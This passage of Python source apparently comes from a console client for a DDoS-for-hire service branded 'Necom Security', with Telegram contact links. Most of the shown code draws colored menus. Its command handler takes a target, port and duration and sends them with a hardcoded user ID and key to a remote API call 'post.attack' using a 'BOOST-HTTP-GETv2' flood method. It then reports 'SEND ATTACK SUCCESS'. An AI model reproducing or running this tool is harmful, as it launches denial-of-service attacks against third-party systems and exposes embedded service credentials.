...
def help():
    ...
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"exit     "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Exit Necom Security                    "+Fore.LIGHTGREEN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"╠═════════════════════════════════════════════════════╣\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"THANK    "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Thanks for using Necom Security.       "+Fore.LIGHTGREEN_EX+"║\n")
    ...
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"github   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" t.me/NecomSecurity                     "+Fore.LIGHTGREEN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
def infoattack():
...
def layer7():
    ...
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"╔═════════╩═════════════════════════════════╩══════════╗\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"getv2   "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" L7 requests get, not bypass             "+Fore.LIGHTGREEN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"╚══════════════════════════════════════════════════════╝\n") 
    stdout.write("\n")
##############################################################################################
def layer4():
...
def title():
    ...
    stdout.write("             "+Fore.LIGHTGREEN_EX+"║ "+Fore.LIGHTWHITE_EX   +"       Tele https://t.me/mr_necom "+Fore.LIGHTGREEN_EX  +"                  ║\n")
...
##############################################################################################
def command():
    stdout.write(Fore.LIGHTGREEN_EX+"╔═══"+Fore.LIGHTGREEN_EX+"[""root"+Fore.LIGHTGREEN_EX+"@"+Fore.LIGHTGREEN_EX+"necom"+Fore.CYAN+"]"+Fore.LIGHTGREEN_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
    command = input()
    if command == "cls" or command == "clear":
        ...
        exit()
    elif command.split(" ")[0] == "getv2":
        target = command.split(" ")[1]
        port = command.split(" ")[2]
        t = command.split(" ")[3]
        if str(command).split(" ")[0] == "getv2":
            med = "BOOST-HTTP-GETv2"
        else:
            med = "NOT FOUND"
        run = requests.get(f"{url}?userid=24716&key=2MUP1-77625-DCZ0S&command=post.attack&type=auto&target={target}&port={port}&time={t}&method={med}").json()
        if (str(run["success"]) == "False"):
            error = run["message"]
            stdout.write(f"\n\x1b[38;2;255;20;147m • "+Fore.WHITE+error+Fore.LIGHTGREEN_EX+"\n\n")
        else:
            stdout.write("\n\x1b[38;2;255;20;147m • "+Fore.WHITE+"SEND ATTACK SUCCESS  "+Fore.LIGHTGREEN_EX+"\n\n")
